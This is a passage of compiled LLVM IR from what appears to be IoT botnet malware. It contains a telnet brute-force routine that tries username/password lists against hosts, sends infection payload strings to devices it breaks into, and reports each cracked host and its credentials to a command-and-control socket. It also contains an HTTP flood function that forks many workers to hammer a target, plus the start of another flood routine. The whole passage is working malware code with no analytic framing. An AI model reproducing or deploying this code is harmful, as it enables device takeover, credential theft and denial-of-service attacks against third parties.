  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %383, i32 0, i32 4
  %385 = load i8, i8* %384, align 2
  %386 = zext i8 %385 to i64
  %387 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %386
  %388 = load i8*, i8** %387, align 8
  %389 = load i32, i32* %1, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %390
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %391, i32 0, i32 4
  %393 = load i8, i8* %392, align 2
  %394 = zext i8 %393 to i64
  %395 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %394
  %396 = load i8*, i8** %395, align 8
  %397 = call i64 @strlen(i8* %396) #10
  %398 = call i64 @send(i32 %380, i8* %388, i64 %397, i32 16384)
  %399 = icmp slt i64 %398, 0
  br i1 %399, label %400, label %404

; <label>:400:                                    ; preds = %375
  %401 = load i32, i32* %1, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %402
  call void @reset_telstate(%struct.telstate_t* %403)
  br label %740

; <label>:404:                                    ; preds = %375
  %405 = load i32, i32* %1, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %406
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %407, i32 0, i32 0
  %409 = load i32, i32* %408, align 16
  %410 = call i64 @send(i32 %409, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.307, i32 0, i32 0), i64 2, i32 16384)
  %411 = icmp slt i64 %410, 0
  br i1 %411, label %412, label %416

; <label>:412:                                    ; preds = %404
  %413 = load i32, i32* %1, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %414
  call void @reset_telstate(%struct.telstate_t* %415)
  br label %740

; <label>:416:                                    ; preds = %404
  %417 = load i32, i32* %1, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %418
  call void @advance_state(%struct.telstate_t* %419, i32 4)
  br label %739

; <label>:420:                                    ; preds = %90
  %421 = load i32, i32* %1, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %422
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %423, i32 0, i32 0
  %425 = load i32, i32* %424, align 16
  %426 = load i32, i32* %7, align 4
  %427 = load i32, i32* %1, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %428
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %429, i32 0, i32 9
  %431 = load i8*, i8** %430, align 8
  %432 = call i32 @read_until_response(i32 %425, i32 %426, i8* %431, i32 512, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %433 = icmp ne i32 %432, 0
  br i1 %433, label %434, label %451

; <label>:434:                                    ; preds = %420
  %435 = load i32, i32* %1, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 9
  %439 = load i8*, i8** %438, align 8
  %440 = call i32 @contains_fail(i8* %439)
  %441 = icmp ne i32 %440, 0
  br i1 %441, label %442, label %446

; <label>:442:                                    ; preds = %434
  %443 = load i32, i32* %1, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %444
  call void @advance_state(%struct.telstate_t* %445, i32 0)
  br label %450

; <label>:446:                                    ; preds = %434
  %447 = load i32, i32* %1, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %448
  call void @advance_state(%struct.telstate_t* %449, i32 5)
  br label %450

; <label>:450:                                    ; preds = %446, %442
  br label %740

; <label>:451:                                    ; preds = %420
  %452 = load i32, i32* %1, align 4
  %453 = sext i32 %452 to i64
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %453
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %454, i32 0, i32 7
  %456 = load i32, i32* %455, align 16
  %457 = add i32 %456, 6
  %458 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %459 = icmp ult i32 %457, %458
  br i1 %459, label %460, label %464

; <label>:460:                                    ; preds = %451
  %461 = load i32, i32* %1, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %462
  call void @reset_telstate(%struct.telstate_t* %463)
  br label %464

; <label>:464:                                    ; preds = %460, %451
  br label %739

; <label>:465:                                    ; preds = %90
  %466 = load i32, i32* %1, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 0
  %470 = load i32, i32* %469, align 16
  %471 = load i32, i32* %1, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 5
  %475 = load i8, i8* %474, align 1
  %476 = zext i8 %475 to i64
  %477 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %476
  %478 = load i8*, i8** %477, align 8
  %479 = load i32, i32* %1, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %480
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %481, i32 0, i32 5
  %483 = load i8, i8* %482, align 1
  %484 = zext i8 %483 to i64
  %485 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %484
  %486 = load i8*, i8** %485, align 8
  %487 = call i64 @strlen(i8* %486) #10
  %488 = call i64 @send(i32 %470, i8* %478, i64 %487, i32 16384)
  %489 = icmp slt i64 %488, 0
  br i1 %489, label %490, label %494

; <label>:490:                                    ; preds = %465
  %491 = load i32, i32* %1, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %492
  call void @reset_telstate(%struct.telstate_t* %493)
  br label %740

; <label>:494:                                    ; preds = %465
  %495 = load i32, i32* %1, align 4
  %496 = sext i32 %495 to i64
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %496
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %497, i32 0, i32 0
  %499 = load i32, i32* %498, align 16
  %500 = call i64 @send(i32 %499, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.307, i32 0, i32 0), i64 2, i32 16384)
  %501 = icmp slt i64 %500, 0
  br i1 %501, label %502, label %506

; <label>:502:                                    ; preds = %494
  %503 = load i32, i32* %1, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %504
  call void @reset_telstate(%struct.telstate_t* %505)
  br label %740

; <label>:506:                                    ; preds = %494
  %507 = load i32, i32* %1, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %508
  call void @advance_state(%struct.telstate_t* %509, i32 6)
  br label %739

; <label>:510:                                    ; preds = %90
  %511 = load i32, i32* %1, align 4
  %512 = sext i32 %511 to i64
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %512
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %513, i32 0, i32 0
  %515 = load i32, i32* %514, align 16
  %516 = load i32, i32* %7, align 4
  %517 = load i32, i32* %1, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 9
  %521 = load i8*, i8** %520, align 8
  %522 = call i32 @read_until_response(i32 %515, i32 %516, i8* %521, i32 512, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %523 = icmp ne i32 %522, 0
  br i1 %523, label %524, label %594

; <label>:524:                                    ; preds = %510
  %525 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %526 = load i32, i32* %1, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 7
  store i32 %525, i32* %529, align 16
  %530 = load i32, i32* %1, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %531
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %532, i32 0, i32 9
  %534 = load i8*, i8** %533, align 8
  %535 = call i32 @contains_fail(i8* %534)
  %536 = icmp ne i32 %535, 0
  br i1 %536, label %537, label %541

; <label>:537:                                    ; preds = %524
  %538 = load i32, i32* %1, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %539
  call void @advance_state(%struct.telstate_t* %540, i32 0)
  br label %593

; <label>:541:                                    ; preds = %524
  %542 = load i32, i32* %1, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 9
  %546 = load i8*, i8** %545, align 8
  %547 = call i32 @contains_success(i8* %546)
  %548 = icmp ne i32 %547, 0
  br i1 %548, label %549, label %588

; <label>:549:                                    ; preds = %541
  %550 = load i32, i32* %1, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 3
  %554 = load i8, i8* %553, align 1
  %555 = zext i8 %554 to i32
  %556 = icmp eq i32 %555, 2
  br i1 %556, label %557, label %561

; <label>:557:                                    ; preds = %549
  %558 = load i32, i32* %1, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %559
  call void @advance_state(%struct.telstate_t* %560, i32 7)
  br label %587

; <label>:561:                                    ; preds = %549
  %562 = load i32, i32* @mainCommSock, align 4
  %563 = load i32, i32* %1, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %564
  %566 = call i8* @get_telstate_host(%struct.telstate_t* %565)
  %567 = load i32, i32* %1, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %568
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %569, i32 0, i32 4
  %571 = load i8, i8* %570, align 2
  %572 = zext i8 %571 to i64
  %573 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %572
  %574 = load i8*, i8** %573, align 8
  %575 = load i32, i32* %1, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %576
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %577, i32 0, i32 5
  %579 = load i8, i8* %578, align 1
  %580 = zext i8 %579 to i64
  %581 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %580
  %582 = load i8*, i8** %581, align 8
  %583 = call i32 (i32, i8*, ...) @sockprintf(i32 %562, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.308, i32 0, i32 0), i8* %566, i8* %574, i8* %582)
  %584 = load i32, i32* %1, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %585
  call void @advance_state(%struct.telstate_t* %586, i32 7)
  br label %587

; <label>:587:                                    ; preds = %561, %557
  br label %592

; <label>:588:                                    ; preds = %541
  %589 = load i32, i32* %1, align 4
  %590 = sext i32 %589 to i64
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %590
  call void @reset_telstate(%struct.telstate_t* %591)
  br label %592

; <label>:592:                                    ; preds = %588, %587
  br label %593

; <label>:593:                                    ; preds = %592, %537
  br label %740

; <label>:594:                                    ; preds = %510
  %595 = load i32, i32* %1, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %596
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %597, i32 0, i32 7
  %599 = load i32, i32* %598, align 16
  %600 = add i32 %599, 7
  %601 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %602 = icmp ult i32 %600, %601
  br i1 %602, label %603, label %607

; <label>:603:                                    ; preds = %594
  %604 = load i32, i32* %1, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %605
  call void @reset_telstate(%struct.telstate_t* %606)
  br label %607

; <label>:607:                                    ; preds = %603, %594
  br label %739

; <label>:608:                                    ; preds = %90
  %609 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %610 = load i32, i32* %1, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 7
  store i32 %609, i32* %613, align 16
  %614 = load i32, i32* %1, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %615
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %616, i32 0, i32 0
  %618 = load i32, i32* %617, align 16
  %619 = call i64 @send(i32 %618, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0), i64 4, i32 16384)
  %620 = icmp slt i64 %619, 0
  br i1 %620, label %621, label %622

; <label>:621:                                    ; preds = %608
  br label %622

; <label>:622:                                    ; preds = %621, %608
  %623 = load i32, i32* %1, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 0
  %627 = load i32, i32* %626, align 16
  %628 = call i64 @send(i32 %627, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.310, i32 0, i32 0), i64 7, i32 16384)
  %629 = icmp slt i64 %628, 0
  br i1 %629, label %630, label %631

; <label>:630:                                    ; preds = %622
  br label %631

; <label>:631:                                    ; preds = %630, %622
  %632 = load i32, i32* %1, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %633
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %634, i32 0, i32 0
  %636 = load i32, i32* %635, align 16
  %637 = load i8*, i8** @infect, align 8
  %638 = load i8*, i8** @infect, align 8
  %639 = call i64 @strlen(i8* %638) #10
  %640 = call i64 @send(i32 %636, i8* %637, i64 %639, i32 16384)
  %641 = icmp slt i64 %640, 0
  br i1 %641, label %642, label %658

; <label>:642:                                    ; preds = %631
  %643 = load i32, i32* %1, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 0
  %647 = load i32, i32* %646, align 16
  %648 = load i8*, i8** @infect2, align 8
  %649 = load i8*, i8** @infect2, align 8
  %650 = call i64 @strlen(i8* %649) #10
  %651 = call i64 @send(i32 %647, i8* %648, i64 %650, i32 16384)
  %652 = icmp slt i64 %651, 0
  br i1 %652, label %653, label %657

; <label>:653:                                    ; preds = %642
  %654 = load i32, i32* %1, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %655
  call void @reset_telstate(%struct.telstate_t* %656)
  br label %740

; <label>:657:                                    ; preds = %642
  br label %658

; <label>:658:                                    ; preds = %657, %631
  %659 = load i32, i32* %1, align 4
  %660 = sext i32 %659 to i64
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %660
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %661, i32 0, i32 0
  %663 = load i32, i32* %662, align 16
  %664 = load i32, i32* %7, align 4
  %665 = load i32, i32* %1, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %666
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %667, i32 0, i32 9
  %669 = load i8*, i8** %668, align 8
  %670 = call i32 @read_until_response(i32 %663, i32 %664, i8* %669, i32 512, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infected, i32 0, i32 0))
  %671 = icmp ne i32 %670, 0
  br i1 %671, label %672, label %716

; <label>:672:                                    ; preds = %658
  %673 = load i32, i32* %1, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 9
  %677 = load i8*, i8** %676, align 8
  %678 = call i32 (i8*, i8**, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8**, ...)*)(i8* %677, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infectedmessage, i32 0, i32 0))
  %679 = icmp ne i32 %678, 0
  br i1 %679, label %680, label %715

; <label>:680:                                    ; preds = %672
  %681 = load i32, i32* %1, align 4
  %682 = sext i32 %681 to i64
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %682
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %683, i32 0, i32 3
  %685 = load i8, i8* %684, align 1
  %686 = zext i8 %685 to i32
  %687 = icmp ne i32 %686, 3
  br i1 %687, label %688, label %715

; <label>:688:                                    ; preds = %680
  %689 = load i32, i32* @mainCommSock, align 4
  %690 = load i32, i32* %1, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %691
  %693 = call i8* @get_telstate_host(%struct.telstate_t* %692)
  %694 = load i32, i32* %1, align 4
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %695
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %696, i32 0, i32 4
  %698 = load i8, i8* %697, align 2
  %699 = zext i8 %698 to i64
  %700 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %699
  %701 = load i8*, i8** %700, align 8
  %702 = load i32, i32* %1, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 5
  %706 = load i8, i8* %705, align 1
  %707 = zext i8 %706 to i64
  %708 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %707
  %709 = load i8*, i8** %708, align 8
  %710 = call i32 (i32, i8*, ...) @sockprintf(i32 %689, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.311, i32 0, i32 0), i8* %693, i8* %701, i8* %709)
  %711 = load i32, i32* %1, align 4
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %712
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %713, i32 0, i32 3
  store i8 3, i8* %714, align 1
  br label %715

; <label>:715:                                    ; preds = %688, %680, %672
  br label %716

; <label>:716:                                    ; preds = %715, %658
  %717 = load i32, i32* %1, align 4
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %718
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %719, i32 0, i32 7
  %721 = load i32, i32* %720, align 16
  %722 = add i32 %721, 8
  %723 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %724 = icmp ult i32 %722, %723
  br i1 %724, label %725, label %738

; <label>:725:                                    ; preds = %716
  %726 = load i32, i32* %1, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %727
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %728, i32 0, i32 3
  %730 = load i8, i8* %729, align 1
  %731 = zext i8 %730 to i32
  %732 = icmp ne i32 %731, 3
  br i1 %732, label %733, label %734

; <label>:733:                                    ; preds = %725
  br label %734

; <label>:734:                                    ; preds = %733, %725
  %735 = load i32, i32* %1, align 4
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %736
  call void @reset_telstate(%struct.telstate_t* %737)
  br label %738

; <label>:738:                                    ; preds = %734, %716
  br label %739

; <label>:739:                                    ; preds = %738, %607, %506, %464, %416, %374, %329, %231, %90
  br label %740

; <label>:740:                                    ; preds = %739, %653, %593, %502, %490, %450, %412, %400, %360, %311, %307, %196, %165, %152
  %741 = load i32, i32* %1, align 4
  %742 = add nsw i32 %741, 1
  store i32 %742, i32* %1, align 4
  br label %73

; <label>:743:                                    ; preds = %73
  br label %71
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #5
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #5
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #4

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [62 x i8*], align 16
  %14 = alloca [3 x i8*], align 16
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = bitcast [62 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %19, i8* bitcast ([62 x i8*]* @sendHTTP.useragents to i8*), i64 496, i32 16, i1 false)
  %20 = bitcast [3 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %20, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %21, %22
  store i32 %23, i32* %16, align 4
  %24 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %25 = load i8*, i8** %8, align 8
  %26 = load i8*, i8** %10, align 8
  %27 = call i32 @rand() #5
  %28 = srem i32 %27, 3
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [3 x i8*], [3 x i8*]* %14, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @rand() #5
  %33 = srem i32 %32, 65
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [62 x i8*], [62 x i8*]* %13, i64 0, i64 %34
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* %24, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.377, i32 0, i32 0), i8* %25, i8* %26, i8* %31, i8* %36) #5
  store i32 0, i32* %15, align 4
  br label %38

; <label>:38:                                     ; preds = %67, %6
  %39 = load i32, i32* %15, align 4
  %40 = load i32, i32* %12, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %70

; <label>:42:                                     ; preds = %38
  %43 = call i32 @fork() #5
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %66

; <label>:45:                                     ; preds = %42
  br label %46

; <label>:46:                                     ; preds = %64, %45
  %47 = load i32, i32* %16, align 4
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = icmp sgt i32 %47, %48
  br i1 %49, label %50, label %65

; <label>:50:                                     ; preds = %46
  %51 = load i8*, i8** %7, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %18, align 4
  %54 = load i32, i32* %18, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %50
  %57 = load i32, i32* %18, align 4
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = call i64 @strlen(i8* %59) #10
  %61 = call i64 @write(i32 %57, i8* %58, i64 %60)
  %62 = load i32, i32* %18, align 4
  %63 = call i32 @close(i32 %62)
  br label %64

; <label>:64:                                     ; preds = %56, %50
  br label %46

; <label>:65:                                     ; preds = %46
  call void @_exit(i32 1) #12
  unreachable

; <label>:66:                                     ; preds = %42
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %15, align 4
  br label %38

; <label>:70:                                     ; preds = %38
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #2

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
